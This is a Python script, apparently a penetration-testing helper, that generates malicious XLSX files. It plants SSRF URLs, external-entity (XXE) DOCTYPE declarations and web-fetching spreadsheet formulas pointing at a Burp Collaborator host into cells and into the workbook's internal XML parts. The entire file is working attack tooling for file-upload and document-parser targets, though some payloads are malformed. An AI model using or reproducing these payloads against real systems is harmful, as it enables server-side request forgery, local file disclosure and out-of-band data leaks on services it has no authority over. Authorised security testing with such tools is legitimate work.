import zipfile
import shutil
from pathlib import Path
from openpyxl import Workbook
from openpyxl.xml.constants import REL_NS
import xml.etree.ElementTree as ET

def generate_xlsx_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    
    ssrf_payloads = [
        f"http://{burp_collab}/ssrf1",
        f"https://{burp_collab}/ssrf2",
        f"http://127.0.0.1@{burp_collab}/ssrf3",
        f"http://localhost@{burp_collab}/ssrf4",
        f"file://{burp_collab}/ssrf5",
        f"gopher://{burp_collab}/ssrf6",
    ]
    
    xxe_payloads = [
        f'<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe1">',
        f'<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe2">',
        f'<!ENTITY xxe SYSTEM "file://{burp_collab}/xxe3">',
        f'<!ENTITY % xxe SYSTEM "http://{burp_collab}/xxe4">',
        f'<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe5">]>',
        f'<!ENTITY % remote SYSTEM "http://{burp_collab}/xxe6">',
        f'<!ENTITY % int "<!ENTITY &#37; trick SYSTEM \'http://{burp_collab}/xxe7\'>">',
    ]
    
    rce_payloads = [
        f"=HYPERLINK(\"http://{burp_collab}/rce1\",\"test\")",
        f"=WEBSERVICE(\"http://{burp_collab}/rce2\")",
        f"=FILTERXML(\"http://{burp_collab}/rce3\",\"//test\")",
        f"=IMPORTXML(\"http://{burp_collab}/rce4\",\"//test\")",
        f"=IMPORTDATA(\"http://{burp_collab}/rce5\")",
        f"=IMPORTHTML(\"http://{burp_collab}/rce6\",\"table\",1)",
        f"=IMPORTFEED(\"http://{burp_collab}/rce7\")",
    ]
    
    for i, payload in enumerate(ssrf_payloads, 1):
        wb = Workbook()
        ws = wb.active
        ws['A1'] = payload
        output_file = output_dir / f"xlsx_ssrf_{i}.xlsx"
        wb.save(output_file)
    
    for i, payload in enumerate(xxe_payloads, 1):
        wb = Workbook()
        ws = wb.active
        ws['A1'] = 'Test'
        
        xlsx_path = output_dir / f"xlsx_xxe_{i}.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            zip_ref.extractall(output_dir / f"temp_xxe_{i}")
        
        xml_path = output_dir / f"temp_xxe_{i}" / "xl" / "workbook.xml"
        if xml_path.exists():
            tree = ET.parse(xml_path)
            root = tree.getroot()
            
            doctype = f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{payload}">]>'
            xml_str = ET.tostring(root, encoding='unicode')
            xml_with_xxe = doctype + '\n' + xml_str
            
            with open(xml_path, 'w', encoding='utf-8') as f:
                f.write(xml_with_xxe)
            
            with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                temp_dir = output_dir / f"temp_xxe_{i}"
                for file_path in temp_dir.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_dir)
                        zip_ref.write(file_path, arcname)
        
        shutil.rmtree(output_dir / f"temp_xxe_{i}", ignore_errors=True)
    
    xxe_in_sharedstrings = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE xxe [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_sharedstrings">
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
<si><t>test</t></si>
</sst>'''
    
    wb = Workbook()
    ws = wb.active
    ws['A1'] = 'Test'
    xlsx_path = output_dir / "xlsx_xxe_sharedstrings.xlsx"
    wb.save(xlsx_path)
    
    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
        zip_ref.extractall(output_dir / "temp_xxe_sharedstrings")
    
    sharedstrings_path = output_dir / "temp_xxe_sharedstrings" / "xl" / "sharedStrings.xml"
    if sharedstrings_path.exists():
        with open(sharedstrings_path, 'w', encoding='utf-8') as f:
            f.write(xxe_in_sharedstrings)
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            temp_dir = output_dir / "temp_xxe_sharedstrings"
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
    
    shutil.rmtree(output_dir / "temp_xxe_sharedstrings", ignore_errors=True)
    
    for i, payload in enumerate(rce_payloads, 1):
        wb = Workbook()
        ws = wb.active
        ws['A1'] = payload
        output_file = output_dir / f"xlsx_rce_{i}.xlsx"
        wb.save(output_file)
    
    wb = Workbook()
    ws = wb.active
    ws['A1'] = f'=HYPERLINK("http://{burp_collab}/rce_hyperlink","Click")'
    ws['A2'] = f'=WEBSERVICE("http://{burp_collab}/rce_webservice")'
    ws['A3'] = f'=FILTERXML("http://{burp_collab}/rce_filterxml","//test")'
    ws['A4'] = f'=IMPORTXML("http://{burp_collab}/rce_importxml","//test")'
    ws['A5'] = f'=IMPORTDATA("http://{burp_collab}/rce_importdata")'
    output_file = output_dir / "xlsx_rce_multiple.xlsx"
    wb.save(output_file)
    
    xxe_in_styles = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE stylesheet [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_styles">
]>
<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<fonts count="1">
<font>
<sz val="11"/>
<name val="Calibri"/>
</font>
</fonts>
</styleSheet>'''
    
    wb = Workbook()
    ws = wb.active
    ws['A1'] = 'Test'
    xlsx_path = output_dir / "xlsx_xxe_styles.xlsx"
    wb.save(xlsx_path)
    
    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
        zip_ref.extractall(output_dir / "temp_xxe_styles")
    
    styles_path = output_dir / "temp_xxe_styles" / "xl" / "styles.xml"
    if styles_path.exists():
        with open(styles_path, 'w', encoding='utf-8') as f:
            f.write(xxe_in_styles)
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            temp_dir = output_dir / "temp_xxe_styles"
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
    
    shutil.rmtree(output_dir / "temp_xxe_styles", ignore_errors=True)
    
    xxe_in_content_types = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE Types [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_content_types">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
</Types>'''
    
    wb = Workbook()
    ws = wb.active
    ws['A1'] = 'Test'
    xlsx_path = output_dir / "xlsx_xxe_content_types.xlsx"
    wb.save(xlsx_path)
    
    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
        zip_ref.extractall(output_dir / "temp_xxe_content_types")
    
    content_types_path = output_dir / "temp_xxe_content_types" / "[Content_Types].xml"
    if content_types_path.exists():
        with open(content_types_path, 'w', encoding='utf-8') as f:
            f.write(xxe_in_content_types)
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            temp_dir = output_dir / "temp_xxe_content_types"
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
    
    shutil.rmtree(output_dir / "temp_xxe_content_types", ignore_errors=True)
    
    xxe_in_worksheet = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE worksheet [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_worksheet">
]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData>
<row r="1">
<c r="A1"><v>1</v></c>
</row>
</sheetData>
</worksheet>'''
    
    wb = Workbook()
    ws = wb.active
    ws['A1'] = 'Test'
    xlsx_path = output_dir / "xlsx_xxe_worksheet.xlsx"
    wb.save(xlsx_path)
    
    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
        zip_ref.extractall(output_dir / "temp_xxe_worksheet")
    
    worksheet_path = output_dir / "temp_xxe_worksheet" / "xl" / "worksheets" / "sheet1.xml"
    if worksheet_path.exists():
        with open(worksheet_path, 'w', encoding='utf-8') as f:
            f.write(xxe_in_worksheet)
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            temp_dir = output_dir / "temp_xxe_worksheet"
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
    
    shutil.rmtree(output_dir / "temp_xxe_worksheet", ignore_errors=True)
    
    xxe_in_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE Relationships [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_rels">
]>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>'''
    
    wb = Workbook()
    ws = wb.active
    ws['A1'] = 'Test'
    xlsx_path = output_dir / "xlsx_xxe_rels.xlsx"
    wb.save(xlsx_path)
    
    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
        zip_ref.extractall(output_dir / "temp_xxe_rels")
    
    rels_path = output_dir / "temp_xxe_rels" / "_rels" / ".rels"
    if rels_path.exists():
        with open(rels_path, 'w', encoding='utf-8') as f:
            f.write(xxe_in_rels)
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            temp_dir = output_dir / "temp_xxe_rels"
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
    
    shutil.rmtree(output_dir / "temp_xxe_rels", ignore_errors=True)

